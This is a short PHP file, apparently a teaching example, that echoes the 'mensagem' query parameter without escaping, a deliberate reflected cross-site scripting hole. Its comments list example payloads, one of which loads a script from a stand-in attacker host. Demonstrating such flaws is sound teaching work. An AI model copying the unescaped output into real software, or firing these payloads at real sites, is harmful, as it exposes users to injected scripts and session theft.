<?php

# http://localhost/xss.php?mensagem=<script>alert('XSS');</script>
# http://localhost/xss.php?mensagem=<marquee><h1>XSS</h1></marquee>
# http://localhost/xss.php?mensagem=<script src=http://atacante.segphp4linux.com.br/domal.js></script>

echo isset($_GET['mensagem']) ? $_GET['mensagem'] : '';